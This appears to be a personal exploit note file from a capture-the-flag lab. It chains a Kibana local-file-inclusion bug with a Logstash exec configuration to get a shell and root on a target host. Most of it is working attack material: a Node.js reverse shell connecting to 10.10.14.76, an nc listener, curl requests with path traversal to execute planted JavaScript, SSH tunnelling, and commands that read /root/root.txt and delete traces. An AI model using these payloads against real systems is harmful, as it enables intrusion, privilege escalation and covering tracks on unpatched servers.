#lfi first step to kibana
https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/

#rev shell: the ip is the vpn ip and the port is w.e
https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(7000, "10.10.14.76", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();

#localhost:1234 opens kibana
ssh -L 1234:localhost:5601: security@10.10.10.115

#ssh -L AAAAAA:BBBBBBB:CCCCCCC:DDDDDD@EEEEEEEEE
A:  my local port
B:  an ip accessed by the remote host of creds given as D@E
C:  port accessed by B
D:  user
E:  remote ip target
so.... on my localhost:A access B:C as if I were D@E

# listen on the port
nc -lvp PORT_IN_JS

#runs the js to connect to the nc listenting port
http://localhost:1234/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../tmp/.krs2.js
curl -v 'http://localhost:9999/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../tmp/.a.js'

# must create new js each time for some reason
#
# check etc/logstash for config.d files
# /usr/share/kibana/bin/../node/bin/node --no-warnings /usr/share/kibana/bin/../src/cli -c /etc/kibana/kibana.yml

input {
        file {
                path => "/opt/kibana/logstash_*" << DO I GO IN HERE AND CREATE THIS FILE?
                start_position => "beginning"
                sincedb_path => "/dev/null"
                stat_interval => "10 second"
                type => "execute"
                mode => "read"
        }
}

output {
        if [type] == "execute" {
                stdout { codec => json }
                exec {
                        command => "%{comando} &"
                }
        }
}

filter {
        if [type] == "execute" {
                grok {
                        match => { "message" => "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
                }
        }
}


#starts kibana
/usr/share/kibana/bin/../node/bin/node --no-warnings /usr/share/kibana/bin/../src/cli -c /etc/kibana/kibana.yml

#notes:
curl -v 'http://localhost:9999/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../tmp/.a.js'
Ejecutar comando : find /root >> test.txt
yml       : /etc/kibana && /etc/logstash
logstash_*: /opt/kibana/
*.conf    : /etc/logstash/conf.d
logs      : /var/log/logstash

cp /etc/logstash/conf.d/input.conf /etc/logstash/conf.d/a.conf; rm /etc/logstash/conf.d/a.conf; cp /etc/logstash/conf.d/input.conf /etc/logstash/conf.d/a.conf
cp /tmp/.template /opt/kibana/logstash_kun; cat /opt/kibana/logstash_kun; ls /opt/kibana

/root/root.txt 
Ejecutar comando : cat /root/root.txt >> /tmp/.temp.txt; rm test.txt
Ejecutar comando : rm /tmp/.temp.txt
Ejecutar comando : rm test.txt
